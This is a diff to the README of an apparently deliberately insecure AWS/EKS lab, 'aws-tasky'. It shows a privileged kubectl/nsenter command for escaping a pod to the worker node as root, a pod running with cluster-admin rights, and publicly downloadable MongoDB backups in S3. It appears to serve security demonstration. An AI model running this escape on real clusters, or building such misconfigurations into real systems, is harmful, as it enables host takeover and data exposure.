@@ -52,6 +52,7 @@ While the infrastructure is being provisioned review the resources that are bein
 
 #### Mongo DB
 * [DB build script](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2/templates/mongo.sh)
+
 Its recommended to shift left to the Infrastructure pipeline and use Packer to build the mongodb image.  Leverage your standard secrets mgmt solution to configure DB access to avoid leaking sensitive data in the process.  This image was created using Terraform's user_data to keep everything simple and using a single tool.
 
 #### AWS EKS Cluster 1.29
@@ -60,10 +61,11 @@ Its recommended to shift left to the Infrastructure pipeline and use Packer to b
 
 #### AWS Loadbalancer controller
 * [AWS LB controller](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_eks_cluster_alb/aws_alb_controller.tf) 
+
 This was installed as a best pratice to support internal NLB or ALBs to EKS services.  The required pulic subnet tags were added as part of the VPC creation to enable the ALB to discover EKS services in the private subnets.
 
 
-## Connect to EKS clusters
+## Connect to EKS
 Connect to EKS using `scripts/kubectl_connect_eks.sh`.  Pass this script the path to the terraform state file used to provision the EKS cluster.  If cwd is ./infra like above then this command would look like the following:
 ```
 source ../../scripts/kubectl_connect_eks.sh .
@@ -71,7 +73,7 @@ kubectl -n tasky get po
 ```
 This script connects EKS and builds some useful aliases shown in the output.
 
-## Get Ingress URL
+## Get the Ingress URL
 Use this URL to access the Tasky application.  Login to verify Tasky is healthy and create tasks.
 ```
 make getIngress
@@ -80,7 +82,7 @@ Tasky URL - http://tasky-ingress-1379807902.us-west-2.elb.amazonaws.com
 ```
 FYI: The Makefile can also be used to see pre and post security scans, build infra, and clean up the project.
 
-## Tasky Application
+## Tasky Application - Verify RBAC
 Is the application running with cluster-admin privileges?
 
 The tasky pod should be running a second container `network-multitool`.  To see if containers have cluster-admin privilages connect to the sidecar, install `kubectl`, and use it to **escape into the Working Node as root!**
@@ -89,11 +91,11 @@ curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stabl
 chmod 755 kubectl
 ```
 
-Escape into the Node with kubectl
+Escape into the Node as **root** with kubectl
 ```
 ./kubectl run r00t --restart=Never -ti --rm --image tasky --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
 ```
-## SSH to MongoDB
+## SSH to Ext MongoDB
 Get the public IP of the EC2 instance running Mongo DB
 ```
 IP=$(terraform output -json | jq -r '.usw2_ec2_ip.value."usw2-shared-ext-mongodb"')
@@ -110,9 +112,7 @@ Verify the backups are going to S3, they are public, and can be downloaded.  Sta
 ```
 terraform output bucket_url
 ```
-You should see a list of .tar.gz file.  These are the DB backups happening every 5 minutes.  Copy one of the file names and add `/<filename> to the URL above.  This should download the file.
-
-## Next Steps
+You should see a list of .tar.gz files.  These are the DB backups happening every 5 minutes.  Copy one of the file names and update the URL with `/<filename>`.  This should download the exact file.
 
 ## Notes
 Delete other namespaces to show you have cluster-admin privileges
